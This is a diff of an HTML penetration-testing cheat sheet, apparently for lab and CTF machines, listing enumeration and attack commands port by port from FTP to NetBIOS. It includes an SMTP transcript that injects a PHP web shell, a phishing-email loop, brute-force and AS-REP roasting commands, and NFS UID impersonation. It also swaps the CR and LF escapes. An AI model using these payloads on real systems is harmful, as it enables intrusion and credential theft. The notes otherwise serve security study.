@@ -109,2111 +109,2111 @@
         <li>If FTP is rejecting user login *without* asking for a password then we can enumerate users</li>
         <li>Tools
             <table>
-              <tr>
-                  <td>Connect to server</td>
-                  <td>ftp &lt;ip addres&gt;</td>
-              </tr>
-              <tr>
-                  <td>Upload file</td>
-                  <td>put &lt;file&gt;</td>
-              </tr>
-              <tr>
-                  <td>Download file</td>
-                  <td>get &lt;file&gt;</td>
-              </tr>
-              <tr>
-                  <td>Upload multiple files</td>
-                  <td>mput *[.&lt;.php/.html/etc...&gt;]</td>
-              </tr>
-              <tr>
-                  <td>Download multiple files</td>
-                  <td>mget *[.&lt;.php/.html/etc...&gt;]</td>
-              </tr>
-              <tr>
-                  <td>Local current directory</td>
-                  <td>lcd</td>
-              </tr>
-              <tr>
-                  <td>Set binary mode</td>
-                  <td>binary</td>
-              </tr>
-          </table>
-      </li>
-      <li>
-        wget
-        <table>
-            <tr>
-                <td>Recursively download FTP contents</td>
-                <td>wget -r ftp://&lt;user&gt;&lt;ip address&gt; --password=&lt;password&gt;</td>
-            </tr>
-            <tr>
-                <td>Mirror FTP</td>
-                <td>wget --mirror ftp://&lt;user&gt;:&lt;password&gt;@&lt;ip address&gt;</td>
-            </tr>
-        </table>
-    </li>
-    <li>Proftp
-        <ul>
-            <li>Can copy a file between remote directories using write permissions
-                <table>
-                    <tr>
-                        <td>Connect to FTP server </td>
-                        <td>telnet &lt;ip address&gt; &lt;port&gt;</td>
-                    </tr>
-                    <tr>
-                        <td>Select a file to copy</td>
-                        <td>site cpfr &lt;remote file&gt;</td>
-                    </tr>
-                    <tr>
-                        <td>Select a location to copy file to</td>
-                        <td>Site cpto &lt;remote directory to copy file to&gt;</td>
-                    </tr>
-                </table>
-            </li>
-        </ul>
-    </li>
-</ul>
-
-<h2>22 TCP / SSH</h2>
-
-<ul>
-    <li>Most common attack is brute forcing
-        <ul>
-            <li>Password attacks against enumerated usernames and default usernames</li>
-            <li>Brute force password with Hydra</li>
-            <li>Brute force priavete keys with Crowbar</li>
-            <li>Fuzz passwords using patator</li>
-            <li>Metasploit ssh_login</li>
-            <li>Bruteforcing can lock you out.  Possibly for a set period of time.</li>
-        </ul>
-    </li>
-    <li>Sometimes the password prompt is disabled and login is only allowed using a private key</li>
-    <li>SSH Key Fingerprint
-        <ul>
-            <li>Based on the hosts public key
-                <li>/etc/ssh/ssh_host_rsa_key.pub</li>
-                <li>Used for easy identification of the hosts public key</li>
-            </li>
-        </ul>
-    </li>
-</ul>
-
-<table>
-    <tr>
-        <td>Connect with a different key exchange algorithm</td>
-        <td>-oKexAlgorithms=+&lt;algorithm&gt;</td>
-    </tr>
-    <tr>
-        <td>Connect with a different type of key</td>
-        <td>-oPubkeyAcceptedKeyTypes=+&lt;key type - example: ssh-dss&gt;</td>
-    </tr>
-</table>
-
-<h2>25 TCP / SMTP</h2>
-
-<ul>
-    <li>Simple Mail Transfer Protocol</li>
-    <ul>
-        <li>SMTP Commands:
-            <table>
                 <tr>
-                    <td>VRFY &lt;username&gt;</td>
-                    <td>asks a server to verify an email address</td>
+                    <td>Connect to server</td>
+                    <td>ftp &lt;ip address&gt;</td>
                 </tr>
                 <tr>
-                    <td>EXPN</td>
-                    <td>Asks the server for the membership of a mailing list</td>
+                    <td>Upload file</td>
+                    <td>put &lt;file&gt;</td>
+                </tr>
+                <tr>
+                    <td>Download file</td>
+                    <td>get &lt;file&gt;</td>
+                </tr>
+                <tr>
+                    <td>Upload multiple files</td>
+                    <td>mput *[.&lt;.php/.html/etc...&gt;]</td>
+                </tr>
+                <tr>
+                    <td>Download multiple files</td>
+                    <td>mget *[.&lt;.php/.html/etc...&gt;]</td>
+                </tr>
+                <tr>
+                    <td>Local current directory</td>
+                    <td>lcd</td>
+                </tr>
+                <tr>
+                    <td>Set binary mode</td>
+                    <td>binary</td>
                 </tr>
             </table>
         </li>
-        <li>Sends mail</li>
-        <li>On internal networks you can typically send emails as anybody</li>
-        <li>SMTP poisoning
-            <pre>
-                telnet 10.0.0.12 25
-                Trying 10.0.0.12...
-                Connected to 10.0.0.12.
-                Escape character is '^]'.
-                220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
-                HELO example.com
-                250 symfonos.localdomain
-                mail from: hacker@example.com
-                250 2.1.0 Ok
-                rcpt to: helios@symfonos.localdomain
-                250 2.1.5 Ok
-                data
-                354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;
-                subject: 
-                &lt;?php echo shell_exec($_GET['cmd]); ?&gt;
-                .
-                250 2.0.0 Ok: queued as 8A6884082B
-                quit
-                221 2.0.0 Bye
-                Connection closed by foreign host.
-            </pre>
+        <li>
+            wget
+            <table>
+                <tr>
+                    <td>Recursively download FTP contents</td>
+                    <td>wget -r ftp://&lt;user&gt;&lt;ip address&gt; --password=&lt;password&gt;</td>
+                </tr>
+                <tr>
+                    <td>Mirror FTP</td>
+                    <td>wget --mirror ftp://&lt;user&gt;:&lt;password&gt;@&lt;ip address&gt;</td>
+                </tr>
+            </table>
         </li>
-        <li>LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
-    </ul>
-</ul>
-<li>Tools</li>
-<ul>
-    <li>nc
-        <ul>
-            <li>Use nc -nvC to implement a full CRLF, sometimes this is needed if a response is not being received from the server
-                <table>
-                    <tr>
-                        <td>CR - Carriage Return</td>
-                        <td>\n</td>
-                    </tr>
-                    <tr>
-                        <td>LF - Line Feed</td>
-                        <td>\r</td>
-                    </tr>
-                </table>
-            </li>
-        </ul>
-    </li>
-</ul>
-<li>Telnet</li>
-<li>swaks
-    <ul>
-        <li>Swiss Army Knift SMTP
-            <li>
-                <table>
-                    <tr>
-                        <tr>Bash script to send emails to a list</tr>
+        <li>Proftp
+            <ul>
+                <li>Can copy a file between remote directories using write permissions
+                    <table>
                         <tr>
-                            <pre>for email in $(cat email.lst);
-                                do
-                                swaks \
-                                --from support@sneakymailer.htb \
-                                --to $email \
-                                --header 'Subject: Please Register Your Account' \
-                                --body 'http://10.10.14.106/test' \
-                                --server sneakymailer.htb
-                            done;</pre>
+                            <td>Connect to FTP server </td>
+                            <td>telnet &lt;ip address&gt; &lt;port&gt;</td>
                         </tr>
-                    </tr>
-                </table>
-            </li>
+                        <tr>
+                            <td>Select a file to copy</td>
+                            <td>site cpfr &lt;remote file&gt;</td>
+                        </tr>
+                        <tr>
+                            <td>Select a location to copy file to</td>
+                            <td>Site cpto &lt;remote directory to copy file to&gt;</td>
+                        </tr>
+                    </table>
+                </li>
+            </ul>
         </li>
     </ul>
-</li>
-<li>Thunderbird
-    <ul>
-        <li>Mail client</li>
-    </ul>
-</li>
-<li>Evolution
-    <ul>
-        <li>Mail Client</li>
-        <li>Alt+F2</li>
-    </ul>
-</li>
 
-<h2>53 TCP / DNS</h2>
+    <h2>22 TCP / SSH</h2>
 
-<ul>
-    <li>If DNS is running then we can edit /etc/resolv.conf instead of /etc/hosts so it will autobatically grab other DNS names</li>
     <ul>
-        <li>resolv.conf hosts will be searched in order from top to bottom</li>
+        <li>Most common attack is brute forcing
+            <ul>
+                <li>Password attacks against enumerated usernames and default usernames</li>
+                <li>Brute force password with Hydra</li>
+                <li>Brute force priavete keys with Crowbar</li>
+                <li>Fuzz passwords using patator</li>
+                <li>Metasploit ssh_login</li>
+                <li>Bruteforcing can lock you out.  Possibly for a set period of time.</li>
+            </ul>
+        </li>
+        <li>Sometimes the password prompt is disabled and login is only allowed using a private key</li>
+        <li>SSH Key Fingerprint
+            <ul>
+                <li>Based on the hosts public key
+                    <li>/etc/ssh/ssh_host_rsa_key.pub</li>
+                    <li>Used for easy identification of the hosts public key</li>
+                </li>
+            </ul>
+        </li>
     </ul>
 
-    <li>nslookup</li>
     <table>
         <tr>
-            <td>Resolve IP to domain name</td>
-            <td>
-                <table>
-                    <tr>
-                        <td>Start nslookup in interactive mode</td>
-                        <td>nslookup</td>
-                    </tr>
-                    <tr>
-                        <td>Enter server IP</td>
-                        <td>&lt;ip address&gt;</td>
-                    </tr>
-                    <tr>
-                        <td>Enter IP and/or hostname to resolve against the server</td>
-                        <td>
-                            <ul>
-                                <li>ip addresses to try:</li>
-                                <ul>
-                                    <li>ip of the nameserver itself</li>
-                                    <li>127.0.0.1</li>
-                                    <li>127.0.0.2</li>
-                                    <li>Any other suspected interested ip addresses or hostnames</li>
-                                </ul>
-                            </ul>
-                        </td>
-                    </tr>
-                    <tr>
-                        <td>Zone transfer</td>
-                        <td>ls -d &lt;domain&gt;</td>
-                    </tr>
-                </table>
-            </td>
+            <td>Connect with a different key exchange algorithm</td>
+            <td>-oKexAlgorithms=+&lt;algorithm&gt;</td>
+        </tr>
+        <tr>
+            <td>Connect with a different type of key</td>
+            <td>-oPubkeyAcceptedKeyTypes=+&lt;key type - example: ssh-dss&gt;</td>
         </tr>
     </table>
 
-    <li>Host</li>
+    <h2>25 TCP / SMTP</h2>
+
     <ul>
+        <li>Simple Mail Transfer Protocol</li>
+        <ul>
+            <li>SMTP Commands:
+                <table>
+                    <tr>
+                        <td>VRFY &lt;username&gt;</td>
+                        <td>asks a server to verify an email address</td>
+                    </tr>
+                    <tr>
+                        <td>EXPN</td>
+                        <td>Asks the server for the membership of a mailing list</td>
+                    </tr>
+                </table>
+            </li>
+            <li>Sends mail</li>
+            <li>On internal networks you can typically send emails as anybody</li>
+            <li>SMTP poisoning
+                <pre>
+                    telnet 10.0.0.12 25
+                    Trying 10.0.0.12...
+                    Connected to 10.0.0.12.
+                    Escape character is '^]'.
+                    220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+                    HELO example.com
+                    250 symfonos.localdomain
+                    mail from: hacker@example.com
+                    250 2.1.0 Ok
+                    rcpt to: helios@symfonos.localdomain
+                    250 2.1.5 Ok
+                    data
+                    354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;
+                    subject: 
+                    &lt;?php echo shell_exec($_GET['cmd]); ?&gt;
+                    .
+                    250 2.0.0 Ok: queued as 8A6884082B
+                    quit
+                    221 2.0.0 Bye
+                    Connection closed by foreign host.
+                </pre>
+            </li>
+            <li>LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
+        </ul>
+    </ul>
+    <li>Tools</li>
+    <ul>
+        <li>nc
+            <ul>
+                <li>Use nc -nvC to implement a full CRLF, sometimes this is needed if a response is not being received from the server
+                    <table>
+                        <tr>
+                            <td>CR - Carriage Return</td>
+                            <td>\n</td>
+                        </tr>
+                        <tr>
+                            <td>LF - Line Feed</td>
+                            <td>\r</td>
+                        </tr>
+                    </table>
+                </li>
+            </ul>
+        </li>
+    </ul>
+    <li>Telnet</li>
+    <li>swaks
+        <ul>
+            <li>Swiss Army Knift SMTP
+                <li>
+                    <table>
+                        <tr>
+                            <tr>Bash script to send emails to a list</tr>
+                            <tr>
+                                <pre>for email in $(cat email.lst);
+                                    do
+                                    swaks \
+                                    --from support@sneakymailer.htb \
+                                    --to $email \
+                                    --header 'Subject: Please Register Your Account' \
+                                    --body 'http://10.10.14.106/test' \
+                                    --server sneakymailer.htb
+                                done;</pre>
+                            </tr>
+                        </tr>
+                    </table>
+                </li>
+            </li>
+        </ul>
+    </li>
+    <li>Thunderbird
+        <ul>
+            <li>Mail client</li>
+        </ul>
+    </li>
+    <li>Evolution
+        <ul>
+            <li>Mail Client</li>
+            <li>Alt+F2</li>
+        </ul>
+    </li>
+
+    <h2>53 TCP / DNS</h2>
+
+    <ul>
+        <li>If DNS is running then we can edit /etc/resolv.conf instead of /etc/hosts so it will autobatically grab other DNS names</li>
+        <ul>
+            <li>resolv.conf hosts will be searched in order from top to bottom</li>
+        </ul>
+
+        <li>nslookup</li>
         <table>
             <tr>
                 <td>Resolve IP to domain name</td>
-                <td>host &lt;ip address&gt;<br>host &lt;domain name&gt; &lt;DNS Server&gt;</td>
-            </tr>
-            <tr>
-                <td>Find all mx records for example.ecom</td>
-                <td>host -t mx &lt;Domain Name&gt;<br>Example: host -t mx example.com</td>
-            </tr>
-            <tr>
-                <td>Zone Transfer</td>
-                <td>host -l &lt;domain name&gt; &lt;DNS Sever&gt;<br>Example: host -l cronos.htb ns1.cronos.htb<br>Example: host -l cronos.htb &lt;ip address&gt;</td>
-            </tr>
-            <tr>
-                <td>Find name servers</td>
-                <td>host -t ns example.com</td>
-            </tr>
-        </table>
-    </ul>
-    <li>dig</li>
-    <table>
-        <tr>
-            <td>Zone Transfer</td>
-            <td>dig axfr &lt;Domain - Example: friendzone.htb&gt; @&lt;ns ip address&gt;</td>
-        </tr>
-    </table>
-    <li>DNSRecon</li>
-    <table>
-        <tr>
-            <td>Zone Transfer</td>
-            <td>dnsrecon -d &lt;Domain&gt; -t axfr -n &lt;DNS Address&gt;</td>
-        </tr>
-    </table>
-    <li>Gobuster</li>
-    <table>
-        <tr>
-            <td>Subdomain brute force</td>
-            <td>gobuster dns -d &lt;Domain Name&gt; -w  /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</td>
-        </tr>
-    </table>
-    <li>dnsEnum</li>
-    <li>wfuzz</li>
-    <table>
-        <tr>
-            <td>Run scan to look for other subdomains</td>
-            <td>
-                <table>
-                    <tr>
-                        <td>Run 1st scan to check char length on responses and immediately push ctrl+c</td>
-                        <td>wfuzz -c -u &lt;IP Address&gt; -H "Host: FUZZ:&lt;Domain Name&lt;" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</td>
-                    </tr>
-                    <tr>
-                        <td>Run 2nd scan with --hh &gt;#&lt; flag to hide response to exclude length of page the coincides with directories that do not exist</td>
-                        <td>wfuzz -c -u &lt;IP Address&gt; -H "Host: FUZZ:&lt;Domain Name&gt;" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh &lt;Char Length #&gt;</td>
-                    </tr>
-                </table>
-            </td>
-        </tr>
-    </table>
-</ul>
-
-<h2>69 UDP / TFTP</h2>
-
-<ul>
-    <li>No command to list files</li>
-    <li>Mostly the same commands as FTP</li>
-</ul>
-
-<h2>80 TCP / HTTP</h2>
-
-<ul>
-    <li>Hosts file is located in /etc/hosts</li>
-    <li>Check headers for evidence of what the server is running</li>
-    <li>gobuster
-        <ul>
-            <li>Enumerate directories</li>
-        </ul>
-    </li>
-    <li>feroxbuster
-        <ul>
-            <li>Enumerate directories recursivley</li>
-        </ul>
-    </li>
-    <li>Google web server version to find OS version that the host is running</li>
-    <li>curl
-        <table>
-            <tr>
-                <td>banner grab</td>
-                <td>-i</td>
-            </tr>
-            <tr>
-                <td>Follow page redirections and grab header</td>
-                <td>-L -i</td>
-            </tr>
-            <tr>
-                <td>Silent mode.  Do not show progress meter or error messages.</td>
-                <td>-s</td>
+                <td>
+                    <table>
+                        <tr>
+                            <td>Start nslookup in interactive mode</td>
+                            <td>nslookup</td>
+                        </tr>
+                        <tr>
+                            <td>Enter server IP</td>
+                            <td>&lt;ip address&gt;</td>
+                        </tr>
+                        <tr>
+                            <td>Enter IP and/or hostname to resolve against the server</td>
+                            <td>
+                                <ul>
+                                    <li>ip addresses to try:</li>
+                                    <ul>
+                                        <li>ip of the nameserver itself</li>
+                                        <li>127.0.0.1</li>
+                                        <li>127.0.0.2</li>
+                                        <li>Any other suspected interested ip addresses or hostnames</li>
+                                    </ul>
+                                </ul>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>Zone transfer</td>
+                            <td>ls -d &lt;domain&gt;</td>
+                        </tr>
+                    </table>
+                </td>
             </tr>
         </table>
-    </li>
-    <li>html2text
-        <ul>
-            <li>Render page in CLI</li>
-        </ul>
-    </li>
-</ul>
 
-<h2>88 TCP / Kerberos</h2>
-
-<ul>
-    <li>Tools</li>
-    <ul>
-        <li>Bloodhound</li>
+        <li>Host</li>
         <ul>
-            <li>Analyzes relationships between AD objects</li>
-        </ul>
-        <table>
-            <tr>
-                <td>Generate file for bloodhound to analyze</td>
-                <td>sudo python3 bloodhound.py -c all -u &lt;user&gt; -p '&lt;password&gt;' -ns &lt;ip&gt; -d &lt;domain name&gt; --zip</td>
-            </tr>
-        </table>
-    </ul>
-    <li>Kerbrute</li>
-    <ul>
-        <li>Can enumerate AD usernames
             <table>
                 <tr>
-                    <td>Enumerate usename list</td>
-                    <td>userenum -d &gt;domain or ip&lt; &gt;username list&lt;<br>-/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</td>
+                    <td>Resolve IP to domain name</td>
+                    <td>host &lt;ip address&gt;<br>host &lt;domain name&gt; &lt;DNS Server&gt;</td>
+                </tr>
+                <tr>
+                    <td>Find all mx records for example.ecom</td>
+                    <td>host -t mx &lt;Domain Name&gt;<br>Example: host -t mx example.com</td>
+                </tr>
+                <tr>
+                    <td>Zone Transfer</td>
+                    <td>host -l &lt;domain name&gt; &lt;DNS Sever&gt;<br>Example: host -l cronos.htb ns1.cronos.htb<br>Example: host -l cronos.htb &lt;ip address&gt;</td>
+                </tr>
+                <tr>
+                    <td>Find name servers</td>
+                    <td>host -t ns example.com</td>
+                </tr>
+            </table>
+        </ul>
+        <li>dig</li>
+        <table>
+            <tr>
+                <td>Zone Transfer</td>
+                <td>dig axfr &lt;Domain - Example: friendzone.htb&gt; @&lt;ns ip address&gt;</td>
+            </tr>
+        </table>
+        <li>DNSRecon</li>
+        <table>
+            <tr>
+                <td>Zone Transfer</td>
+                <td>dnsrecon -d &lt;Domain&gt; -t axfr -n &lt;DNS Address&gt;</td>
+            </tr>
+        </table>
+        <li>Gobuster</li>
+        <table>
+            <tr>
+                <td>Subdomain brute force</td>
+                <td>gobuster dns -d &lt;Domain Name&gt; -w  /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</td>
+            </tr>
+        </table>
+        <li>dnsEnum</li>
+        <li>wfuzz</li>
+        <table>
+            <tr>
+                <td>Run scan to look for other subdomains</td>
+                <td>
+                    <table>
+                        <tr>
+                            <td>Run 1st scan to check char length on responses and immediately push ctrl+c</td>
+                            <td>wfuzz -c -u &lt;IP Address&gt; -H "Host: FUZZ:&lt;Domain Name&lt;" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</td>
+                        </tr>
+                        <tr>
+                            <td>Run 2nd scan with --hh &gt;#&lt; flag to hide response to exclude length of page the coincides with directories that do not exist</td>
+                            <td>wfuzz -c -u &lt;IP Address&gt; -H "Host: FUZZ:&lt;Domain Name&gt;" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh &lt;Char Length #&gt;</td>
+                        </tr>
+                    </table>
+                </td>
+            </tr>
+        </table>
+    </ul>
+
+    <h2>69 UDP / TFTP</h2>
+
+    <ul>
+        <li>No command to list files</li>
+        <li>Mostly the same commands as FTP</li>
+    </ul>
+
+    <h2>80 TCP / HTTP</h2>
+
+    <ul>
+        <li>Hosts file is located in /etc/hosts</li>
+        <li>Check headers for evidence of what the server is running</li>
+        <li>gobuster
+            <ul>
+                <li>Enumerate directories</li>
+            </ul>
+        </li>
+        <li>feroxbuster
+            <ul>
+                <li>Enumerate directories recursivley</li>
+            </ul>
+        </li>
+        <li>Google web server version to find OS version that the host is running</li>
+        <li>curl
+            <table>
+                <tr>
+                    <td>banner grab</td>
+                    <td>-i</td>
+                </tr>
+                <tr>
+                    <td>Follow page redirections and grab header</td>
+                    <td>-L -i</td>
+                </tr>
+                <tr>
+                    <td>Silent mode.  Do not show progress meter or error messages.</td>
+                    <td>-s</td>
                 </tr>
             </table>
         </li>
-        <li>Can also be used to brute force passwords.  Uses preauth method so it will not generate a typical failed login error code</li>
-    </ul>
-    <li>AS-REP Roasting</li>
-    <ul>
-        <li>Retrieve a ticket for a use that has DONT_REQ_PREAUTH enabled and then crack it</li>
-        <ul>
-            <li>DONT_REQ_PREAUTH means the DC will provide a TGT without verifying the request for the ticket was encrypted by the password of the user that is requesting the TGT.</li>
-        </ul>
-        <li>Attack can be done from machine that is not joined to the domain</li>
-        <ul>
-            <li>Enumeration is easier on a domain-joined machine - you can use LDAP Filter or PowerView to find targets</li>
-        </ul>
-        <li>Attack from a windows machine:</li>
-        <ul>
-            <li>Tools:</li>
+        <li>html2text
             <ul>
-                <li>PowerView.ps1 - Enumerate Users</li>
-                <li>ASREPRoast.ps1 - Retrieve ticket hashes</li>
-                <li>Rebeus - C#/.NET replacement for ASREPRoast.ps1.  Harder for victim to detect.</li>
+                <li>Render page in CLI</li>
             </ul>
-        </ul>
-        <li>Attack from linux</li>
-        <ul>
-            <li>User enumeration methods:</li>
-            <ul>
-                <li>Using LDAP, may need a domain users credentials to access.</li>
-                <li>Brute force - kerbrute</li>
-                <li>Any other means</li>
-            </ul>
-            <li>Request tickets/retrieve hashes using Impacket-GetNPUsers</li>
-            <ul>
-                <li>Impacket-GetNPUsers -dc-ip &lt;ip&gt; &lt;domain&gt;/ -no-pass -usersfile &lt;file&gt; -outputfile &lt;file&gt;&lt; -outputfile &lt;file&gt;</li>  
-            </ul>
-        </ul>
-    </ul>   
-</ul>
-
-<li>Good article on Kerberose attacking: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting</li>
-<br>
-
-<h2>110 TCP / POP3</h2>
-
-<li>Post Office Protocol 3</li>
-<ul>
-    <li>Used to receive emails</li>
-    <li>If we can log on to a POP3 server we can potentially read people's emails</li>
-    <li>Logging in can allow us to read data, not write</li>
-</ul>
-<li>Tools</li>
-<ul>
-    <li>Evolution email client can be used</li>
-    <li>nc -nv &lt;ip address&gt; &lt;port&gt;</li>
-    <li>nc -nvC</li>
-    <ul>
-        <li>add C flag if not getting a response</li>
+        </li>
     </ul>
-    <li>telnet</li>
-</ul>
 
-<table>
-    <tr>
-        <td>Pick username to login with</td>
-        <td>USER &lt;username&gt;</td>
-    </tr>
-    <tr>
-        <td>Enter password for user</td>
-        <td>PASS &lt;password&gt;</td>
-    </tr>
-    <tr>
-        <td>List Emails</td>
-        <td>LIST</td>
-    </tr>
-    <tr>
-        <td>Read email</td>
-        <td>RETR &lt;email # from LIST&gt;</td>
-    </tr>
-</table>
+    <h2>88 TCP / Kerberos</h2>
 
-<h2>111 TCP / rpcbind / NFS</h2>
-<ul>
-    <li>A portmapper</li>
-    <li>Should list NFS ports</li>
-    <li>Like a telephone book, similar to DNS, that maps out program numbers to ports</li>
-    <li>Listens on port 111.  Maps RPC services to the ports they listen on.  Clients provide the program number they are trying to access and RPCbind redirects the client to the port # for that service.</li>
-    <li>Tools</li>
-    <ul>
-        <li>rpcinfo</li>
-        <ul>
-            <li>Utility that will connect to the RPC server and report back any information divulged by the server.</li>
-            <li>Command: rpcinfo &lt;ip address&gt;</li>
-            <table>
-                <tr>
-                    <td>Compact Results</td>
-                    <td>-s</td>
-                </tr>
-                <tr>
-                    <td>Display all registered RP programs and show port numbers</td>
-                    <td>-p</td>
-                </tr>
-            </table>
-        </ul>
-        <li>nmap</li>
-        <ul>
-            <li>rpcinfo script</li>
-        </ul>
-        <li>netcat</li>
-        <ul>
-            <li>nc -nv &lt;ip address&gt;</li>
-        </ul>
-    </ul>
-    <li>Network File System (NFS)</li>
-    <ul>
-        <li>Often used with Unix systems.  Can be difficult to setup securely so it is not uncommon that NFS shares are open to the world.</li>
-        <li>Gain access to files that show an owner with a UUID #</li>
-        <ul>
-            <li>Create a new user on local machine with same UUID # as the user that has access to that file or folder</li>
-            <ul>
-                <li>Create and use imposter user:</li>
-                <ul>
-                    <li>adduser &lt;user&gt;</li>
-                    <li>Change UUID in /etc/passwd</li>
-                    <li>sudo su &lt;newuser&gt;</li>
-                </ul>
-            </ul>
-        </ul>
-    </ul>
-</ul>
-
-<table>
-    <tr>
-        <td>Mount NFS Share</td>
-        <td>sudo mount -o nolock &lt;ip address&gt;:/&lt;share name&gt; ~/&lt;Local directory to mount to&gt;<br><table>
-            <tr>
-                <td>Disable File locaking.  Often needed for older NFS servers</td>
-                <td>-o nolock</td>
-            </tr>
-        </table></td>
-    </tr>
-    <tr>
-        <td>Show mounting information</td>
-        <td>showmount<br><table>
-            <tr>
-                <td>Show all mount points</td>
-                <td>-a</td>
-            </tr>
-            <tr>
-                <td>Show all directories</td>
-                <td>-d</td>
-            </tr>
-            <tr>
-                <td>Show export list</td>
-                <td>-e</td>
-            </tr>
-        </table></td>
-    </tr>
-</table>
-
-<h2>113 TCP / ident</h2>
-
-<ul>
-    <li>Used to identify who is using a TCP connection</li>    
-    <ul>
-        <li>By default nmap -sC will enumerate every use of every running port</li>
-    </ul>
-</ul>
-
-<h2>119 TCP / NNTP</h2>
-
-<ul>
-    <li>Network News Transfer Protocol</li>
     <ul>
         <li>Tools</li>
         <ul>
-            <li>netcat</li>
+            <li>Bloodhound</li>
             <ul>
-                <li>nc -nv &lt;ip address&gt; &lt;port&gt;</li>
+                <li>Analyzes relationships between AD objects</li>
             </ul>
+            <table>
+                <tr>
+                    <td>Generate file for bloodhound to analyze</td>
+                    <td>sudo python3 bloodhound.py -c all -u &lt;user&gt; -p '&lt;password&gt;' -ns &lt;ip&gt; -d &lt;domain name&gt; --zip</td>
+                </tr>
+            </table>
         </ul>
-        <li>Commands:</li>
-        <table>
-            <tr>
-                <td>List available commands</td>
-                <td>HELP</td>
-            </tr>
-            <tr>
-                <td>List available articles to read</td>
-                <td>LIST<br>Example:<br><table>
-                    <tr>
-                        <td>LIST<br>215 list of newsgroups follows<br>org.apache.avalon.dev 0 0 y<br>org.apache.avalon.user 0 0 y</td>
-                    </tr>
-                </table><br>The 0 in each column means the first and last article for each newgroup is 0.  This means there are no article available to read.</td>
-            </tr>
-        </table>
-    </ul>
-</ul>
-
-<h2>135 TCP / msrpc</h2>
-
-<ul>
-    <li>Lists all rpc endoints</li>
-    <ul>
-        <li>Typically lists a ton of information that makes it tough to work with</li>
-        <li>Used with other exploits like SMB relays</li>
-    </ul>
-    <li>impacket-rpcdump</li>
-    <table>
-        <tr>
-            <td>Dump all information</td>
-            <td>impacket-rpcdump &lt;ip address&gt;</td>
-        </tr>
-    </table>
-    <li>impacket-rpcmap</li>
-    <table>
-        <tr>
-            <td>Map rpc information</td>
-            <td>'ncacn_ip_tcp:&lt;ip address&gt;'</td>
-        </tr>
-        <tr>
-            <ul>
-                <li>Brute force the endpoints we can interact with and the specific methods</li>
-                <ul>
-                    <li>Google the UUID's</li>
-                    <ul>
-                        <li>site: docs.microsoft.com &lt;UUID&gt;</li>
-                    </ul>
-                </ul>
-            </ul>
-        </tr>
-    </table>
-    <li>metasploit</li>
-    <ul>
-        <li>/auxiliary/scanner/dcerpc/endpoint_mapper</li>
-        <li>/auxiliary/scanner/dcerpc/hidden</li>
-    </ul>
-</ul>
-
-<h2>139 TCP / Netbios</h2>
-
-<ul>
-    <li>Netbios is different from SMB</li>
-    <li>A session layer protocol and service that allows computers on a local network to communicate with each other.</li>
-    <li>Modern implementations of SMB do not require netbios.</li>
-    <li>netbios is required for backwards compatibility with SMB.</li>
-    <li>Tools:</li>
-    <ul>
-        <li>nbtscan</li>
-        <table>
-            <tr>
-                <td>Example Usage</td>
-                <td>sudo nbtscan -r &lt;ip address or range&gt;</td>
-            </tr>
-            <tr>
-                <td>Specify the originating UDP port as 137</td>
-                <td>-r</td>
-            </tr>
-        </table>
-        <li>rpcclient</li>
-        <table>
-            <tr>
-                <td>Typical authentication</td>
-                <td>rpcclient &lt;ip address&gt;</td>
-            </tr>
-            <tr>
-                <td>
-                    <ul>
-                        <li>Null Authentication</li>
-                        <ul>
-                            <li>This generally works on Domains from 2003.  Newly installed domains do not like null authentication</li>
-                            <li>If this works then note that null authentication allows domain enumeration and a lot of information can be found</li>
-                        </ul>
-                    </ul>
-                </td>
-                <td>rpcclient -U '' -N &lt;ip address&gt;</td>
-            </tr>
-            <tr>
-                <td>Enumerate Users</td>
-                <td>enumdomusers<br>querydispinfo</td>
-            </tr>
-            <tr>
-                <td>Get user SID</td>
-                <td>lookupnames &gt;username&lt;</td>
-            </tr>
-            <tr>
-                <td>Enumerate user groups</td>
-                <td> &lt;[rid value]&gt;</td>
-            </tr>
-            <tr>
-                <td>Query group name from rid value</td>
-                <td>querygroup &lt;rid value&gt;</td>
-            </tr>
-            <tr>
-                <td>Enumerate printers</td>
-                <td>enumprinters</td>
-            </tr>
-            <tr>
-                <td>Enumerate groups</td>
-                <td>enumalsgroups [Builtin|Domain]</td>
-            </tr>
-            <tr>
-                <td>Enumerate users (output in SID) in groups</td>
-                <td>queryaliasmem [Builtin|Domain] &lt;rid&gt;</td>
-            </tr>
-            <tr>
-                <td>Change users password (must log in to rpcclient as user)</td>
-                <td>setuserinfo2 &lt;username&gt; 23 '&lt;password&gt;'
-                    <ul>
-                        <li>23 is the USER_INTERAL4_INFORMATION field.  It does things in cleartext.  24 supports encrpytion</li>
-                        <li>NT_STATUS_PASSWORD_RESTRICTION means there was a password complexity failure and the password did not change</li>
-                    </ul>
-                </td>
-            </tr>
-            <tr>
-                <td>Enumerate Domains</td>
-                <td>enumdomains</td>
-            </tr>
-            <tr>
-                <td>Domain SID</td>
-                <td>lsaquery</td>
-            </tr>
-            <tr>
-                <td>Domain info</td>
-                <td>querydominfo</td>
-            </tr>
-            <tr>
-                <td>Create domain user</td>
-                <td>createdomuser</td>
-            </tr>
-            <tr>
-                <td>delete domain user</td>
-                <td>deletedomuser</td>
-            </tr>
-            <tr>
-                <td>Add rights to user account</td>
-                <td>lsaaddacctrights</td>
-            </tr>
-            <tr>
-                <td>Remove rights from user account</td>
-                <td>lsaremoveacctrights</td>
-            </tr>
-            <tr>
-                <td>Enumerate trusted domain within AD forest</td>
-                <td>dsenumdomtrusts</td>
-            </tr>
-        </table>
-    </ul>
-</ul>
-
-<h2>143 TCP / IMAP</h2>
-
-<table>
-    <tr>
-        <td>Login</td>
